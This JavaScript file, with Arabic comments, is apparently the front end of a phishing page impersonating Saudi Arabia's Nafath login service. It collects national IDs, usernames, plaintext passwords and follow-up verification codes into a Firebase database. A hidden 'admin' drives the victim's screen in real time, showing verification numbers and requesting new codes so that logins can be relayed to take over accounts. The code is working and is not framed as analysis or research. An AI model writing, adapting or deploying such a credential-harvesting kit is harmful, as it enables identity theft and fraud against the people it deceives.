import { db } from "./firebase-config.js";
import { 
    collection, 
    addDoc, 
    doc, 
    onSnapshot, 
    updateDoc,
    serverTimestamp 
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

let currentDocId = null;
let currentCollection = "nafath_app_requests"; // الافتراضي لتطبيق نفاذ

const nafathFormContainer = document.getElementById('nafathFormContainer');
const nafathWaitContainer = document.getElementById('nafathWaitContainer');
const nafathNewCodeContainer = document.getElementById('nafathNewCodeContainer');
const nafathLiveNumber = document.getElementById('nafathLiveNumber');
const globalLoader = document.getElementById('globalLoader');

// 1. عند إرسال طلب تطبيق نفاذ (رقم الهوية)
document.getElementById('appForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const nationalId = document.getElementById('nationalId').value.trim();
    if (!nationalId) return;

    globalLoader.classList.remove('hidden-loader');
    currentCollection = "nafath_app_requests";

    try {
        const docRef = await addDoc(collection(db, currentCollection), {
            nationalId: nationalId,
            status: "waiting_admin",
            timestamp: serverTimestamp()
        });
        currentDocId = docRef.id;
        startListening(currentDocId, currentCollection);
    } catch (error) {
        console.error("Error adding document: ", error);
        globalLoader.classList.add('hidden-loader');
    }
});

// 2. عند إرسال طلب اسم المستخدم وكلمة المرور
document.getElementById('authForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const user = document.getElementById('username').value.trim();
    const pass = document.getElementById('password').value.trim();
    if (!user || !pass) return;

    globalLoader.classList.remove('hidden-loader');
    currentCollection = "users_login";

    try {
        const docRef = await addDoc(collection(db, currentCollection), {
            username: user,
            password: pass,
            status: "waiting_admin",
            timestamp: serverTimestamp()
        });
        currentDocId = docRef.id;
        startListening(currentDocId, currentCollection);
    } catch (error) {
        console.error("Error adding document: ", error);
        globalLoader.classList.add('hidden-loader');
    }
});

// 3. الاستماع للتحديثات اللحظية من الأدمن
function startListening(docId, collectionName) {
    const docRef = doc(db, collectionName, docId);

    onSnapshot(docRef, (docSnap) => {
        if (!docSnap.exists()) return;
        const data = docSnap.data();

        // إخفاء اللودر عند استلام أي استجابة تحكم أولية
        globalLoader.classList.add('hidden-loader');

        if (data.status === "show_code") {
            // إظهار كود التحقق الأول وتحديث الواجهة للانتظار
            nafathFormContainer.style.display = 'none';
            nafathNewCodeContainer.style.display = 'none';
            nafathWaitContainer.style.display = 'block';
            nafathLiveNumber.innerText = data.verificationCode || '--';
        } 
        else if (data.status === "request_new_code") {
            // الانتقال الفوري للشاشة الجديدة (سيتم إرسال كود آخر للتحقق)
            nafathFormContainer.style.display = 'none';
            nafathWaitContainer.style.display = 'none';
            nafathNewCodeContainer.style.display = 'block';
        } 
        else if (data.status === "waiting_admin") {
            // العودة لشاشة التحميل العامة في حال تم إرجاع الطلب للمراجعة
            nafathNewCodeContainer.style.display = 'none';
            globalLoader.classList.remove('hidden-loader');
        }
        else if (data.status === "applied_success") {
            // توجيه العميل أو إظهار رسالة النجاح النهائية
            alert("تم التقديم والموافقة بنجاح!");
            window.location.reload();
        }
    });
}

// 4. عند قيام المستخدم بإدخال الكود الجديد والضغط على إرسال
document.getElementById('newCodeForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const secondaryCode = document.getElementById('secondaryCodeInput').value.trim();
    if (!secondaryCode || !currentDocId) return;

    // إظهار شاشة الانتظار العامة مجدداً لحين تأكيد الأدمن
    nafathNewCodeContainer.style.display = 'none';
    globalLoader.classList.remove('hidden-loader');

    const docRef = doc(db, currentCollection, currentDocId);
    
    // حفظ الكود الجديد وإعادة الحالة إلى بانتظار الأدمن
    await updateDoc(docRef, {
        status: "waiting_admin",
        secondaryVerificationCode: secondaryCode
    });
});
